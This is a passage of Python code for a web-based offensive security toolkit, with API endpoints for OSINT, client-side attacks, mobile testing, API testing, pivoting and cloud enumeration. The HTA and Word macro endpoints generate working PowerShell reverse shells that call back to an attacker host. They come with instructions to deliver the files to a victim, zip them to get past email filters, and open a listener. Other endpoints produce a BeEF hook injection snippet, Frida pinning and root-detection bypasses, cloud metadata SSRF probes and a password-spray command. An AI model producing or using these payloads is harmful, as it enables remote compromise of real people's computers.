    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw[:600],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} OSINT item(s)"}


@app.post("/api/osint/maltego")
async def osint_maltego(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    instructions = (
        "# Maltego CE Setup:\n"
        "1. Install: apt-get install maltego\n"
        "2. Launch: maltego\n"
        "3. Register free CE account at maltego.com\n"
        f"4. New Graph -> Add Entity -> Domain -> Set value: {req.target}\n"
        "5. Right-click entity -> Run Transforms -> All Transforms\n"
        "   Recommended transforms:\n"
        "   - To DNS Name [Using DNS]\n"
        "   - To IP Address [DNS]\n"
        "   - To Email Address [PGP]\n"
        "   - To MX Record [DNS]\n"
        "   - To Website [DNS]\n"
        "6. Export: Maltego Graph -> Export as CSV/XLSX\n"
    )
    cli_transforms = [
        f"maltego-trx -d {req.target} -t DNS",
        f"maltego-trx -d {req.target} -t WHOIS",
        f"maltego-trx -d {req.target} -t Email",
    ]
    findings = [
        {"severity": "INFO", "title": "Maltego Setup Instructions", "detail": instructions},
    ]
    for cmd in cli_transforms:
        findings.append({"severity": "INFO", "title": "Transform Command", "detail": cmd})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": instructions,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Maltego instructions generated"}


# ─────────────────────────────────────────────────────────────
# CLIENT-SIDE ATTACKS
# ─────────────────────────────────────────────────────────────

@app.post("/api/client/beef")
async def client_beef(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    r_check = await run_tool(["sh", "-c", "ps aux | grep beef | grep -v grep"], timeout=10)
    beef_running = bool(r_check["output"].strip())
    if not beef_running:
        await run_tool(["sh", "-c", "beef-xss &"], timeout=5)
    lhost = (req.options or {}).get("lhost", req.target)
    hook_url = f"http://{lhost}:3000/hook.js"
    js_snippet = f'<script src="{hook_url}"></script>'
    ui_url = f"http://127.0.0.1:3000/ui/panel"
    findings = [
        {"severity": "HIGH" if beef_running else "MEDIUM",
         "title": "BeEF Status",
         "detail": "BeEF is RUNNING" if beef_running else "BeEF started (may take a moment)"},
        {"severity": "HIGH", "title": "Hook URL", "detail": hook_url},
        {"severity": "INFO", "title": "JS Inject Snippet", "detail": js_snippet},
        {"severity": "INFO", "title": "UI Panel", "detail": ui_url},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings,
            "raw_output": f"hook_url={hook_url}\njs={js_snippet}\nui={ui_url}",
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "message": "BeEF running" if beef_running else "BeEF started"}


@app.post("/api/client/hta_payload")
async def client_hta_payload(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", req.target)
    lport = opts.get("lport", 4444)
    hta_content = (
        f'<html>\n<head>\n<script language="VBScript">\n'
        f'Sub Main()\n'
        f'    Dim shell\n'
        f'    Set shell = CreateObject("WScript.Shell")\n'
        f'    shell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -c '
        f'$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}", 0\n'
        f'    self.close\n'
        f'End Sub\n'
        f'Main\n'
        f'</script>\n</head>\n<body></body>\n</html>\n'
    )
    delivery = (
        f"# Save as payload.hta and host:\n"
        f"python3 -m http.server 80\n"
        f"# Deliver URL to victim: http://{lhost}/payload.hta\n"
        f"# Listener: nc -lvnp {lport}"
    )
    findings = [
        {"severity": "CRITICAL", "title": "HTA Payload", "detail": hta_content[:400]},
        {"severity": "HIGH", "title": "Delivery Instructions", "detail": delivery},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": hta_content,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "HTA payload generated"}


@app.post("/api/client/macro")
async def client_macro(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    lhost = opts.get("lhost", req.target)
    lport = opts.get("lport", 4444)
    vba_code = (
        f'Sub AutoOpen()\n'
        f'    Dim cmd As String\n'
        f'    cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -c '
        f'$c=New-Object System.Net.Sockets.TCPClient(""{lhost}"",{lport});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}"\n'
        f'    Shell "cmd /c " & cmd, vbHide\n'
        f'End Sub\n\n'
        f'Sub Document_Open()\n'
        f'    AutoOpen\n'
        f'End Sub\n'
    )
    instructions = (
        "1. Open Word -> View -> Macros -> Create macro named 'AutoOpen'\n"
        "2. Paste VBA code above\n"
        "3. Save as .docm (Macro-Enabled Document)\n"
        "4. Send to victim via email (zip to bypass email filters)\n"
        f"5. Start listener: nc -lvnp {lport}"
    )
    findings = [
        {"severity": "CRITICAL", "title": "VBA Macro Payload", "detail": vba_code[:400]},
        {"severity": "HIGH", "title": "Embedding Instructions", "detail": instructions},
    ]
    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": vba_code,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "VBA macro generated"}


# ─────────────────────────────────────────────────────────────
# MOBILE TESTING
# ─────────────────────────────────────────────────────────────

@app.post("/api/mobile/apk_info")
async def mobile_apk_info(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    apk_path = opts.get("apk_path", req.target)
    out_dir = f"/tmp/apk_out_{scan_id[:8]}"
    r1 = await run_tool(["aapt", "dump", "badging", apk_path], timeout=30)
    r2 = await run_tool(["apktool", "d", apk_path, "-o", out_dir, "-f"], timeout=60)
    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
    findings = []
    for line in r1["output"].splitlines():
        if line.startswith("package:"):
            findings.append({"severity": "INFO", "title": "Package Info", "detail": line.strip()})
        elif "uses-permission" in line.lower():
            perm = re.search(r"name='([^']+)'", line)
            perm_name = perm.group(1) if perm else line.strip()
            dangerous = any(d in perm_name for d in ["CAMERA", "MICROPHONE", "CONTACTS", "LOCATION",
                                                       "READ_SMS", "RECORD_AUDIO", "CALL_PHONE"])
            sev = "HIGH" if dangerous else "INFO"
            findings.append({"severity": sev, "title": "Permission", "detail": perm_name})
        elif "activity" in line.lower():
            findings.append({"severity": "INFO", "title": "Activity", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "APK Info", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} APK finding(s)"}


@app.post("/api/mobile/decompile")
async def mobile_decompile(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    apk_path = opts.get("apk_path", req.target)
    out_dir = f"/tmp/jadx_{scan_id[:8]}"
    result = await run_tool(["jadx", "-d", out_dir, apk_path], timeout=120)
    raw = result["output"] + result.get("error","")
    findings = []
    if os.path.isdir(out_dir):
        java_files = []
        for root, dirs, files in os.walk(out_dir):
            for f in files:
                if f.endswith(".java"):
                    java_files.append(os.path.join(root, f))
        findings.append({"severity": "INFO", "title": "Decompile Successful",
                         "detail": f"{len(java_files)} Java file(s) at {out_dir}"})
        for jf in java_files[:10]:
            findings.append({"severity": "INFO", "title": "Decompiled File", "detail": jf})
    else:
        findings.append({"severity": "MEDIUM", "title": "Decompile Failed/Partial", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Output at {out_dir}"}


@app.post("/api/mobile/permissions")
async def mobile_permissions(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    apk_path = opts.get("apk_path", req.target)
    manifest_paths = [
        os.path.join(apk_path, "AndroidManifest.xml"),
        "/tmp/apk_out/AndroidManifest.xml",
    ]
    dangerous = {"CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "ACCESS_FINE_LOCATION",
                 "ACCESS_COARSE_LOCATION", "READ_SMS", "SEND_SMS", "READ_CALL_LOG",
                 "WRITE_CONTACTS", "GET_ACCOUNTS", "USE_BIOMETRIC"}
    findings = []
    raw = ""
    for mp in manifest_paths:
        if os.path.exists(mp):
            with open(mp, "r", errors="ignore") as f:
                raw = f.read()
            perms = re.findall(r'android\.permission\.([A-Z_]+)', raw)
            for perm in perms:
                sev = "CRITICAL" if perm in dangerous else "INFO"
                findings.append({"severity": sev, "title": f"Permission: {perm}",
                                 "detail": f"android.permission.{perm}"})
            break
    if not findings:
        result = await run_tool(["aapt", "dump", "permissions", apk_path], timeout=15)
        raw = result["output"] + result.get("error","")
        for line in raw.splitlines():
            perm_m = re.search(r'android\.permission\.([A-Z_]+)', line)
            if perm_m:
                perm = perm_m.group(1)
                sev = "CRITICAL" if perm in dangerous else "INFO"
                findings.append({"severity": sev, "title": f"Permission: {perm}", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "No permissions found", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw[:2000],
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} permission(s)"}


@app.post("/api/mobile/frida_script")
async def mobile_frida_script(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    pkg = opts.get("package_name", req.target)
    bypass_type = opts.get("bypass_type", "ssl")
    scripts = {
        "ssl": (
            "// Frida SSL Pinning Bypass\n"
            "Java.perform(function() {\n"
            "    var CertPinner = Java.use('okhttp3.CertificatePinner');\n"
            "    CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(a, b) {\n"
            "        console.log('[+] SSL Pinning bypassed for: ' + a);\n"
            "    };\n"
            "    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
            "    TrustManager.checkServerTrusted.implementation = function() {};\n"
            "});\n"
        ),
        "root": (
            "// Frida Root Detection Bypass\n"
            "Java.perform(function() {\n"
            "    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');\n"
            "    RootBeer.isRooted.implementation = function() { return false; };\n"
            "    var System = Java.use('java.lang.System');\n"
            "    var Runtime = Java.use('java.lang.Runtime');\n"
            "    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n"
            "        if (cmd.indexOf('su') !== -1) return null;\n"
            "        return this.exec(cmd);\n"
            "    };\n"
            "});\n"
        ),
        "cert": (
            "// Frida Certificate Pinning Bypass (Android < 7)\n"
            "Java.perform(function() {\n"
            "    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
            "    var SSLContext = Java.use('javax.net.ssl.SSLContext');\n"
            "    var TrustManager = Java.registerClass({\n"
            "        name: 'bypass.TrustManager',\n"
            "        implements: [X509TrustManager],\n"
            "        methods: {\n"
            "            checkClientTrusted: function() {},\n"
            "            checkServerTrusted: function() {},\n"
            "            getAcceptedIssuers: function() { return []; }\n"
            "        }\n"
            "    });\n"
            "    var ctx = SSLContext.getInstance('TLS');\n"
            "    ctx.init(null, [TrustManager.$new()], null);\n"
            "    SSLContext.getDefault.implementation = function() { return ctx; };\n"
            "});\n"
        ),
    }
    script = scripts.get(bypass_type, scripts["ssl"])
    run_cmd = f"frida -U -f {pkg} -l bypass_{bypass_type}.js --no-pause"
    findings = [
        {"severity": "HIGH", "title": f"Frida {bypass_type.upper()} Bypass Script", "detail": script[:400]},
        {"severity": "INFO", "title": "Run Command", "detail": run_cmd},
        {"severity": "INFO", "title": "Note", "detail": "Requires frida-server running on device and USB debugging enabled"},
    ]
    return {"scan_id": scan_id, "target": pkg, "findings": findings, "raw_output": script,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Frida {bypass_type} bypass script generated"}


# ─────────────────────────────────────────────────────────────
# API SECURITY
# ─────────────────────────────────────────────────────────────

@app.post("/api/apisec/fuzz")
async def apisec_fuzz(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    result = await run_tool(
        ["ffuf", "-u", f"{req.target}/FUZZ",
         "-w", "/usr/share/wordlists/dirb/common.txt",
         "-mc", "200,301,302,401,403",
         "-H", "Content-Type: application/json",
         "-t", "50"],
        timeout=60
    )
    raw = result["output"] + result.get("error","")
    findings = []
    for line in raw.splitlines():
        m = re.search(r'(\S+)\s+\[Status: (\d+)', line)
        if m:
            endpoint, status = m.group(1), m.group(2)
            sev = "HIGH" if status in ("200", "301") else "MEDIUM"
            findings.append({"severity": sev, "title": f"Endpoint Found: /{endpoint}",
                             "detail": f"Status: {status}"})
    if not findings:
        findings.append({"severity": "INFO", "title": "ffuf output", "detail": raw[:400]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} endpoint(s) found"}


@app.post("/api/apisec/swagger")
async def apisec_swagger(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    paths_to_try = ["/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs", "/swagger/v1/swagger.json"]
    findings = []
    raw_parts = []
    for path in paths_to_try:
        url = req.target.rstrip("/") + path
        result = await run_tool(["curl", "-sk", "--max-time", "10", url], timeout=15)
        raw_parts.append(f"[{url}]\n{result['output'][:200]}")
        if result["output"] and len(result["output"]) > 50:
            try:
                data = json.loads(result["output"])
                endpoints = list(data.get("paths", {}).keys())
                findings.append({"severity": "HIGH", "title": f"Swagger/OpenAPI Found: {path}",
                                 "detail": f"{len(endpoints)} endpoint(s): {', '.join(endpoints[:5])}"})
                for ep, methods in data.get("paths", {}).items():
                    for method in methods.keys():
                        findings.append({"severity": "MEDIUM", "title": f"{method.upper()} {ep}",
                                         "detail": str(methods[method].get("summary", ""))[:100]})
                    if len(findings) > 30:
                        break
                break
            except Exception:
                findings.append({"severity": "INFO", "title": f"Response at {path}", "detail": result["output"][:200]})
    if not findings:
        findings.append({"severity": "INFO", "title": "No Swagger/OpenAPI found", "detail": str(paths_to_try)})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} API spec finding(s)"}


@app.post("/api/apisec/arjun")
async def apisec_arjun(req: ScanRequest, token: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    out_file = f"/tmp/arjun_{scan_id[:8]}.json"
    result = await run_tool(
        ["arjun", "-u", req.target, "--stable", "-oJ", out_file],
        timeout=60
    )
    raw = result["output"] + result.get("error","")
    findings = []
    if os.path.exists(out_file):
        try:
            with open(out_file) as f:
                data = json.load(f)
            for endpoint, params in (data.items() if isinstance(data, dict) else []):
                for param in (params if isinstance(params, list) else []):
                    findings.append({"severity": "MEDIUM", "title": f"Parameter Found: {param}",
                                     "detail": f"Endpoint: {endpoint}"})
        except Exception:
            pass
    for line in raw.splitlines():
        if "parameter" in line.lower() or "found" in line.lower():
            findings.append({"severity": "MEDIUM", "title": "Arjun Finding", "detail": line.strip()})
    if not findings:
        findings.append({"severity": "INFO", "title": "Arjun output", "detail": raw[:300]})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} parameter(s) found"}


@app.post("/api/apisec/auth_test")
async def apisec_auth_test(req: ScanRequest, token_dep: str = Depends(verify_token)):
    scan_id = str(_uuid.uuid4())
    opts = req.options or {}
    token_val = opts.get("token", "")
    endpoints = opts.get("endpoints", [req.target])
    findings = []
    raw_parts = []
    for ep in endpoints[:10]:
        r_no_auth = await run_tool(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", ep], timeout=10)
        code_no_auth = r_no_auth["output"].strip()
        raw_parts.append(f"No-auth {ep}: {code_no_auth}")
        if code_no_auth in ("200", "201"):
            findings.append({"severity": "CRITICAL", "title": "Endpoint Accessible Without Auth",
                             "detail": f"{ep} returned {code_no_auth}"})
        if token_val:
            tampered = token_val[:-4] + "XXXX" if len(token_val) > 4 else token_val + "bad"
            r_tampered = await run_tool(
                ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
                 "-H", f"Authorization: Bearer {tampered}", ep],
                timeout=10
            )
            code_tampered = r_tampered["output"].strip()
            raw_parts.append(f"Tampered JWT {ep}: {code_tampered}")
            if code_tampered in ("200", "201"):
                findings.append({"severity": "CRITICAL", "title": "Accepts Tampered JWT",
                                 "detail": f"{ep} returned {code_tampered} with invalid token"})
            else:
                findings.append({"severity": "INFO", "title": "Tampered JWT Rejected",
                                 "detail": f"{ep} returned {code_tampered}"})
    if not findings:
        findings.append({"severity": "INFO", "title": "Auth test complete", "detail": "\n".join(raw_parts)})
    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} auth finding(s)"}

# ══════════════════════════════════════════════════════════════
#  PIVOT MODULE
# ══════════════════════════════════════════════════════════════

class PivotRequest(BaseModel):
    target: str = ""
    options: dict = {}

@app.post("/api/pivot/ssh_local")
async def pivot_ssh_local(req: PivotRequest, user=Depends(verify_token)):
    t = req.target.strip() or "user@pivot_host"
    rport = req.options.get("remote_port", 3306)
    lport = req.options.get("local_port", 13306)
    cmd = f"ssh -N -L {lport}:127.0.0.1:{rport} {t} -o StrictHostKeyChecking=no"
    findings = [
        {"severity":"INFO","title":"SSH Local Port Forward Command","detail":cmd},
        {"severity":"INFO","title":"Usage after tunnel","detail":f"mysql -h 127.0.0.1 -P {lport} -u root -p  # connects to remote MySQL via tunnel"},
        {"severity":"INFO","title":"nmap through tunnel","detail":f"nmap -sV -p {lport} 127.0.0.1"},
    ]
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":cmd,"message":"SSH local port forward command generated"}

@app.post("/api/pivot/ssh_dynamic")
async def pivot_ssh_dynamic(req: PivotRequest, user=Depends(verify_token)):
    t = req.target.strip() or "user@pivot_host"
    port = req.options.get("socks_port", 1080)
    cmd = f"ssh -N -D {port} {t} -o StrictHostKeyChecking=no"
    findings = [
        {"severity":"INFO","title":"SSH Dynamic SOCKS5 Proxy","detail":cmd},
        {"severity":"INFO","title":"proxychains config","detail":f"Edit /etc/proxychains4.conf:\nsocks5 127.0.0.1 {port}"},
        {"severity":"INFO","title":"Usage","detail":f"proxychains nmap -sT -Pn 10.10.10.1\nproxychains curl http://internal.server\nBrowser proxy: 127.0.0.1:{port}"},
    ]
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":cmd,"message":"SOCKS5 proxy command generated"}

@app.post("/api/pivot/chisel")
async def pivot_chisel(req: PivotRequest, user=Depends(verify_token)):
    kali_ip = req.options.get("kali_ip", "YOUR_KALI_IP")
    port    = req.options.get("port", 8888)
    rport   = req.options.get("remote_port", 3306)
    lport   = req.options.get("local_port", 13306)
    findings = [
        {"severity":"INFO","title":"Step 1 - Kali (server)","detail":f"chisel server -p {port} --reverse"},
        {"severity":"INFO","title":"Step 2 - Target (client)","detail":f"./chisel client {kali_ip}:{port} R:{lport}:127.0.0.1:{rport}"},
        {"severity":"INFO","title":"Result","detail":f"Kali localhost:{lport} -> Target 127.0.0.1:{rport}\nInstall: apt install chisel"},
    ]
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":"","message":"Chisel reverse tunnel commands generated"}

@app.post("/api/pivot/proxychains")
async def pivot_proxychains(req: PivotRequest, user=Depends(verify_token)):
    proxy_ip   = req.options.get("proxy_ip", "127.0.0.1")
    proxy_port = req.options.get("proxy_port", 1080)
    config = f"strict_chain\nproxy_dns\n[ProxyList]\nsocks5  {proxy_ip}  {proxy_port}"
    findings = [
        {"severity":"INFO","title":"/etc/proxychains4.conf","detail":config},
        {"severity":"INFO","title":"nmap through proxy","detail":"proxychains nmap -sT -Pn -p 80,443,22,3306,8080 10.10.10.1"},
        {"severity":"INFO","title":"curl through proxy","detail":"proxychains curl http://internal-host/admin"},
        {"severity":"INFO","title":"Metasploit through proxy","detail":"setg Proxies socks5:127.0.0.1:1080\nsetg ReverseAllowProxy true"},
    ]
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":config,"message":"Proxychains config generated"}

@app.post("/api/pivot/ligolo")
async def pivot_ligolo(req: PivotRequest, user=Depends(verify_token)):
    kali_ip = req.options.get("kali_ip", "YOUR_KALI_IP")
    port    = req.options.get("port", 11601)
    subnet  = req.options.get("subnet", "10.10.10.0/24")
    findings = [
        {"severity":"INFO","title":"Step 1 - Kali: start proxy","detail":f"sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:{port}"},
        {"severity":"INFO","title":"Step 2 - Target: run agent","detail":f"./agent -connect {kali_ip}:{port} -ignore-cert"},
        {"severity":"INFO","title":"Step 3 - Kali: add route","detail":f"sudo ip route add {subnet} dev ligolo\n# In ligolo console: session -> start"},
        {"severity":"INFO","title":"Result","detail":f"Full Layer 3 access to {subnet} - no proxychains needed\nnmap, msf, browser all work natively"},
    ]
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":"","message":"Ligolo-ng setup commands generated"}

# ══════════════════════════════════════════════════════════════
#  CLOUD MODULE
# ══════════════════════════════════════════════════════════════

@app.post("/api/cloud/s3_enum")
async def cloud_s3_enum(req: PivotRequest, user=Depends(verify_token)):
    company = req.target.strip().split(".")[0].replace("https://","").replace("http://","")
    buckets = [company, f"{company}-backup", f"{company}-dev", f"{company}-prod",
               f"{company}-data", f"{company}-assets", f"{company}-logs", f"{company}-public"]
    findings = []
    raw = []
    for b in buckets:
        url = f"https://{b}.s3.amazonaws.com"
        r = await run_tool(["curl","-sk","-o","/dev/null","-w","%{http_code}","--max-time","5",url], timeout=10)
        code = r.get("output","").strip()
        raw.append(f"{b}: HTTP {code}")
        if code == "200":
            findings.append({"severity":"CRITICAL","title":f"Public S3 Bucket: {b}","detail":f"URL: {url}\nHTTP 200 - publicly readable! Check: aws s3 ls s3://{b} --no-sign-request"})
        elif code == "403":
            findings.append({"severity":"MEDIUM","title":f"S3 Bucket Exists (forbidden): {b}","detail":f"Bucket exists. Try: aws s3 ls s3://{b} --no-sign-request"})
    if not findings:
        findings.append({"severity":"INFO","title":"No public S3 buckets found","detail":"\n".join(raw)})
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":"\n".join(raw),"message":f"Checked {len(buckets)} S3 bucket names"}

@app.post("/api/cloud/aws_enum")
async def cloud_aws_enum(req: PivotRequest, user=Depends(verify_token)):
    target = req.target.strip()
    findings = []
    payloads = ["http://169.254.169.254/latest/meta-data/","http://metadata.google.internal/computeMetadata/v1/"]
    for p in payloads:
        ssrf_url = f"{target}?url={p}" if target else p
        r = await run_tool(["curl","-sk","--max-time","5",ssrf_url], timeout=8)
        out = r.get("output","")
        if "iam" in out.lower() or "ami-id" in out.lower() or "instance-id" in out.lower():
            findings.append({"severity":"CRITICAL","title":"AWS Metadata SSRF Confirmed","detail":f"Payload: {p}\nResponse: {out[:500]}"})
        elif out.strip():
            findings.append({"severity":"INFO","title":f"SSRF Response","detail":out[:300]})
    if not findings:
        findings.append({"severity":"INFO","title":"SSRF Test Complete","detail":"No EC2 metadata exposure detected. Manual: curl http://169.254.169.254/latest/meta-data/ from inside target."})
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":"","message":"AWS metadata SSRF test complete"}

@app.post("/api/cloud/azure_enum")
async def cloud_azure_enum(req: PivotRequest, user=Depends(verify_token)):
    domain = req.target.strip().replace("https://","").replace("http://","").split("/")[0]
    findings = []
    r2 = await run_tool(["curl","-sk","--max-time","8",f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"],timeout=12)
    out2 = r2.get("output","")
    if "authorization_endpoint" in out2.lower():
        try:
            j = json.loads(out2)
            tid = j.get("token_endpoint","").split("/")[3]
            findings.append({"severity":"LOW","title":"Azure AD Tenant Found","detail":f"Domain: {domain}\nTenant ID: {tid}\nUser enum: o365spray --spray -U users.txt -p Password1 --domain {domain}"})
        except:
            findings.append({"severity":"LOW","title":"Azure AD Tenant Found","detail":f"Domain {domain} has Azure AD. Try user enumeration."})
    else:
        findings.append({"severity":"INFO","title":"Azure AD Check","detail":f"No Azure AD tenant found for {domain}"})
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":out2[:300],"message":"Azure AD enumeration complete"}

@app.post("/api/cloud/gcp_enum")
async def cloud_gcp_enum(req: PivotRequest, user=Depends(verify_token)):
    company = req.target.strip().split(".")[0].replace("https://","").replace("http://","")
    buckets = [company, f"{company}-backup", f"{company}-data", f"{company}-prod", f"{company}-dev"]
    findings = []
    raw = []
    for b in buckets:
        url = f"https://storage.googleapis.com/{b}"
        r = await run_tool(["curl","-sk","-o","/dev/null","-w","%{http_code}","--max-time","5",url],timeout=8)
        code = r.get("output","").strip()
        raw.append(f"{b}: {code}")
        if code == "200":
            findings.append({"severity":"CRITICAL","title":f"Public GCS Bucket: {b}","detail":f"URL: {url}\nList: gsutil ls gs://{b}"})
        elif code == "403":
            findings.append({"severity":"MEDIUM","title":f"GCS Bucket Exists: {b}","detail":f"Try: gsutil ls gs://{b}"})
    r3 = await run_tool(["curl","-sk","--max-time","3","-H","Metadata-Flavor: Google","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"],timeout=5)
    if r3.get("output","").strip():
        findings.append({"severity":"HIGH","title":"GCP Metadata Accessible","detail":r3["output"][:200]})
    if not findings:
        findings.append({"severity":"INFO","title":"No public GCS buckets found","detail":", ".join(buckets)})
    return {"scan_id":str(uuid.uuid4()),"target":req.target,"findings":findings,
            "raw_output":"\n".join(raw),"message":f"GCP enumeration complete"}

# ══════════════════════════════════════════════════════════════
#  TOOL MANAGER
# ══════════════════════════════════════════════════════════════

TOOL_CHECKS = {
    "nmap":"nmap","masscan":"masscan","amass":"amass","subfinder":"subfinder",
    "theHarvester":"theHarvester","recon-ng":"recon-ng","spiderfoot":"spiderfoot",
    "sherlock":"sherlock","dnsrecon":"dnsrecon","dnsx":"dnsx","httpx":"httpx",
    "wafw00f":"wafw00f","whatweb":"whatweb","nikto":"nikto","gobuster":"gobuster",
    "ffuf":"ffuf","feroxbuster":"feroxbuster","sqlmap":"sqlmap","nuclei":"nuclei",
    "dalfox":"dalfox","arjun":"arjun","wfuzz":"wfuzz","wpscan":"wpscan",
    "msfconsole":"msfconsole","searchsploit":"searchsploit","msfvenom":"msfvenom",
    "crackmapexec":"crackmapexec","evil-winrm":"evil-winrm",
    "hashcat":"hashcat","john":"john","hydra":"hydra","medusa":"medusa",
    "bloodhound":"bloodhound","neo4j":"neo4j","responder":"responder",
    "aircrack-ng":"aircrack-ng","wifite":"wifite","chisel":"chisel",
    "socat":"socat","proxychains4":"proxychains4","apktool":"apktool",
    "jadx":"jadx","frida":"frida","gdb":"gdb","pwntools":"pwn",
    "ropper":"ropper","binwalk":"binwalk","volatility3":"vol",
    "exiftool":"exiftool","yara":"yara","trufflehog":"trufflehog",
    "gitleaks":"gitleaks","semgrep":"semgrep","sublist3r":"sublist3r",
    "impacket-secretsdump":"impacket-secretsdump","bettercap":"bettercap",
}

APT_PACKAGES = [
    "nmap","masscan","amass","theharvester","recon-ng","dnsrecon","wafw00f","whatweb",
    "nikto","gobuster","ffuf","feroxbuster","sqlmap","wpscan","wfuzz","dirb",
    "metasploit-framework","exploitdb","crackmapexec","evil-winrm","impacket-scripts",
    "hashcat","john","hydra","medusa","wordlists",
    "bloodhound","neo4j","responder","ldapdomaindump",
    "aircrack-ng","wifite","hostapd","kismet","bettercap",
    "chisel","socat","proxychains4","sshuttle","ligolo-ng",
    "apktool","adb","frida-tools","objection",
    "gdb","pwndbg","checksec","binwalk","foremost","exiftool","yara",
    "seclists","wordlists","ruby","golang","python3-pip",
    "neo4j","curl","wget","git","build-essential","gcc-multilib",
]

GITHUB_TOOLS = [
    {"name":"pwndbg",      "url":"https://github.com/pwndbg/pwndbg",          "install":"cd /opt/pwndbg && ./setup.sh"},
    {"name":"gef",         "url":"https://github.com/hugsy/gef",               "install":"pip3 install gef"},
    {"name":"PEASS-ng",    "url":"https://github.com/carlospolop/PEASS-ng",    "install":""},
    {"name":"pwncat-cs",   "url":"https://github.com/calebstewart/pwncat",     "install":"cd /opt/pwncat-cs && pip3 install ."},
    {"name":"ligolo-ng",   "url":"https://github.com/nicocha30/ligolo-ng",     "install":"cd /opt/ligolo-ng && go build -o /usr/local/bin/ligolo-proxy cmd/proxy/main.go"},
    {"name":"kerbrute",    "url":"https://github.com/ropnop/kerbrute",         "install":"cd /opt/kerbrute && go build -o /usr/local/bin/kerbrute ."},
    {"name":"chisel",      "url":"https://github.com/jpillora/chisel",         "install":"cd /opt/chisel && go build -o /usr/local/bin/chisel ."},
